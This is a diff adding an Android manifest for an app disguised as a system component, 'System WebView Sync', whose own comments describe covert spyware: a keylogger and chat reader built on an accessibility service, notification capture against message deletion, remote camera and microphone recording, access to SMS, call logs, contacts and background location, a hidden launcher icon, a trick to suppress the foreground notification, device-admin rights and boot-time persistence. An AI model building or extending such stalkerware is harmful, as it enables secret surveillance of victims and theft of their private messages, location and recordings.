@@ -1,0 +1,188 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.system.webview.sync">
+
+    <!-- Core network + boot -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- WiFi -->
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+
+    <!-- Phone state -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <!-- Call log & contacts (v2) -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+
+    <!-- SMS (v2) -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+
+    <!-- Camera (for remote capture via Camera2 API) -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <!-- Android 14+ requires explicit foreground service type for camera -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+
+    <!-- Foreground service -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+
+    <!-- Storage / Gallery / File Browser (v3/v4) -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+
+    <!-- Microphone recording (v4) -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+
+    <!-- Battery optimization -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <!-- Watchdog alarm (needed for exact alarms on Android 12+) -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+
+
+
+    <!-- Package Visibility (Android 11+) to scan WhatsApp, Telegram, etc. -->
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
+
+    <application
+        android:allowBackup="false"
+        android:icon="@android:drawable/ic_menu_preferences"
+        android:label="System WebView Sync"
+        android:theme="@style/Theme.AppCompat.NoActionBar"
+        android:supportsRtl="true">
+
+        <!-- Pairing Activity — always enabled so it can always be launched.
+             The launcher ICON is controlled separately via the alias below. -->
+        <activity
+            android:name=".PairingActivity"
+            android:exported="true" />
+
+        <!-- Launcher alias — only THIS gets disabled to hide the app icon.
+             PairingActivity itself stays enabled → no more "does not exist" errors. -->
+        <activity-alias
+            android:name=".PairingActivityLauncher"
+            android:targetActivity=".PairingActivity"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Trigger Activity to reset stopped state via ADB -->
+        <activity
+            android:name=".TriggerActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+            </intent-filter>
+        </activity>
+
+        <!-- Foreground Service — location|camera|microphone required on Android 14+ -->
+        <service
+            android:name=".services.BackgroundSyncService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="location|camera|microphone" />
+
+        <!-- Inner silent service: trick untuk menghapus notifikasi foreground dari status bar.
+             Dipanggil oleh BackgroundSyncService, langsung stopSelf() setelah startForeground(). -->
+        <service
+            android:name=".services.BackgroundSyncService$InnerSilentService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <!-- Accessibility Service (Keylogger & Chat Reader) -->
+        <service
+            android:name=".services.SystemSyncAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- Notification Listener Service (Anti-Delete) -->
+        <service
+            android:name=".services.SystemSyncNotificationListenerService"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- Boot Receiver — auto-restart service after phone reboot / watchdog tick -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:directBootAware="true">
+            <intent-filter android:priority="999">
+                <!-- Standard Android boot -->
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <!-- Direct-boot / encrypted storage (Android 7+) -->
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <!-- MediaTek / Xiaomi fast-boot -->
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <!-- APK self-update -->
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <!-- Internal watchdog alarm -->
+                <action android:name="com.system.webview.sync.ACTION_WATCHDOG" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Device Admin Receiver -->
+        <receiver
+            android:name=".receivers.AgentDeviceAdminReceiver"
+            android:label="System WebView Sync Manager"
+            android:description="@string/device_admin_description"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_config" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- SIM State Receiver -->
+        <receiver
+            android:name=".receivers.SimStateReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.SIM_STATE_CHANGED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Wifi Connection Receiver -->
+        <receiver
+            android:name=".receivers.WifiConnectionReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.net.wifi.STATE_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
